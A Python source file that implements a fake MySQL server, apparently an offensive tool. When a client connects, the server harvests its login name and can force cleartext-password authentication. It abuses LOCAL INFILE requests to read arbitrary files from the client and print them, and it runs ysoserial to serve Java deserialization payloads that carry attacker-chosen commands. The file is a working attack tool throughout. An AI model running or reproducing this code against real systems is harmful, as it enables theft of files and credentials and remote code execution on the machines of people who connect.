import asyncio
import logging

from mysqlproto.protocol import start_mysql_server
from mysqlproto.protocol.base import OK, ERR, EOF
from mysqlproto.protocol.flags import Capability
from mysqlproto.protocol.handshake import HandshakeV10, HandshakeResponse41, AuthSwitchRequest
from mysqlproto.protocol.query import ColumnDefinition, ColumnDefinitionList, ResultSet,FileReadPacket
import subprocess


fileread_dict={

}

@asyncio.coroutine
def accept_server(server_reader, server_writer):
    task = asyncio.Task(handle_server(server_reader, server_writer))


@asyncio.coroutine
def handle_server(server_reader, server_writer):
    handshake = HandshakeV10()
    handshake.write(server_writer)
    print("Incoming Connection:"+str(server_writer.get_extra_info('peername')[:2]))
    yield from server_writer.drain()
    switch2clear=False
    handshake_response = yield from HandshakeResponse41.read(server_reader.packet(), handshake.capability)
    username = handshake_response.user
    print("Login Username:"+username.decode("ascii"))
    #print("<=", handshake_response.__dict__)
    #检测是否需要切换到mysql_clear_password
    if username.endswith(b"_clear"):
        switch2clear = True
        username = username[:-len("_clear")]
    capability = handshake_response.capability_effective

    if (Capability.PLUGIN_AUTH in capability and
            handshake.auth_plugin != handshake_response.auth_plugin
            and switch2clear):
        print("Switch Auth Plugin to mysql_clear_password")
        AuthSwitchRequest().write(server_writer)
        yield from server_writer.drain()
        auth_response = yield from server_reader.packet().read()
        print("<=", auth_response)

    result = OK(capability, handshake.status)
    result.write(server_writer)
    yield from server_writer.drain()

    while True:
        server_writer.reset()
        packet = server_reader.packet()
        try:
            cmd = (yield from packet.read(1))[0]
        except Exception as _:
            #TODO:可能会出问题 ┓( ´∀` )┏
            return
            pass
        print("<=", cmd)
        if username.startswith(b"fileread_"):
            query =(yield from packet.read())
            FileReadPacket(username[len("fileread_"):]).write(server_writer)
            yield from server_writer.drain()
            #server_writer.reset()
            packet = server_reader.packet()
            print("========file_content=========")
            aaa = (yield from packet.read())
            print(aaa.decode('utf8'))
            print("=======file_content end==========")
            EOF(capability, handshake.status).write(server_writer)
            return 
        elif username in fileread_dict:
            query =(yield from packet.read())
            #print(query)
            FileReadPacket(fileread_dict[username]).write(server_writer)
            #EOF(capability, handshake.status).write(server_writer)
            yield from server_writer.drain()
            #server_writer.reset()
            packet = server_reader.packet()
            print("========file_content=========")
            aaa = (yield from packet.read())
            #可以考虑改成写入的。
            try:
                print(aaa.decode('utf8'))
            except Exception as e:
                #会有decode不了的时候
                print(aaa)
            print("=======file_content end==========")
            EOF(capability, handshake.status).write(server_writer)
            return 
        elif cmd == 1:
            return
        elif cmd == 3:
            query = (yield from packet.read()).decode('ascii')
            print("<=   query:", query)
            if 'SHOW VARIABLES'.lower() in query.lower():
                    print("Sending Fake MySQL Server Environment Data")
                    ColumnDefinitionList((ColumnDefinition('d'),ColumnDefinition('e'))).write(server_writer)
                    EOF(capability, handshake.status).write(server_writer)
                    ResultSet(("system_time_zone","UTC")).write(server_writer)
                    ResultSet(("time_zone","SYSTEM")).write(server_writer)
                    ResultSet(("init_connect","")).write(server_writer)
                    ResultSet(("auto_increment_increment","1")).write(server_writer)
                    ResultSet(("max_allowed_packet","10000")).write(server_writer)

                    result = EOF(capability, handshake.status)
            elif username in yso_dict:
                    #Serial Data
                    print("Sending Presetting YSO Data")
                    ColumnDefinitionList((ColumnDefinition('a'),ColumnDefinition('b'),ColumnDefinition('c'))).write(server_writer)
                    EOF(capability, handshake.status).write(server_writer)
                    #WHY:第三列拿到了第二列的数据？？
                    ResultSet(("11",yso_dict[username],"2333")).write(server_writer)
                    result = EOF(capability, handshake.status)
            elif username.startswith(b"yso_"):
                query =(yield from packet.read())
                _,yso_type,yso_command = username.decode('ascii').split("_")
                print("Sending YSO data with params:%s,%s" % (yso_type,yso_command))
                content = get_yso_content(yso_type,yso_command)
                ColumnDefinitionList((ColumnDefinition('a'),ColumnDefinition('b'),ColumnDefinition('c'))).write(server_writer)
                EOF(capability, handshake.status).write(server_writer)
                #WHY:第三列拿到了第二列的数据？？
                ResultSet(("11",content,"2333")).write(server_writer)
                result = EOF(capability, handshake.status)
            elif query == 'select 1':
                ColumnDefinitionList((ColumnDefinition('database'),)).write(server_writer)
                EOF(capability, handshake.status).write(server_writer)
                ResultSet(('test',)).write(server_writer)
                result = EOF(capability, handshake.status)
            else:
                result = OK(capability, handshake.status)

        else:
            result = ERR(capability)

        result.write(server_writer)
        yield from server_writer.drain()

yso_dict={

}
def get_yso_content(yso_type,command):
    popen = subprocess.Popen([r'java', '-jar', 'ysoserial-0.0.6-SNAPSHOT-all.jar', yso_type, command], stdout=subprocess.PIPE)
    file_content = popen.stdout.read()
    return file_content
def addYsoPaylod(username,yso_type,command):
    yso_dict[username] = get_yso_content(yso_type,command)



logging.basicConfig(level=logging.INFO)

if __name__ == "__main__":
    import json
    with open("config.json") as f:
        data = json.load(f)
    for k,v in data['fileread'].items():
        fileread_dict[k.encode('ascii')] = v.encode('ascii')
    #print(fileread_dict)
    if "yso" in data:
        for k,v in data['yso'].items():
            addYsoPaylod(k.encode('ascii'),v[0],v[1])
    #print(yso_dict)
    print("Load %d Fileread usernames " % len(fileread_dict))
    print("Load %d yso usernames " % len(yso_dict))
    loop = asyncio.get_event_loop()
    f = start_mysql_server(handle_server, host=None, port=3306)
    print("Start MySQL Fake Server at Port 3306")
    loop.run_until_complete(f)
    loop.run_forever()
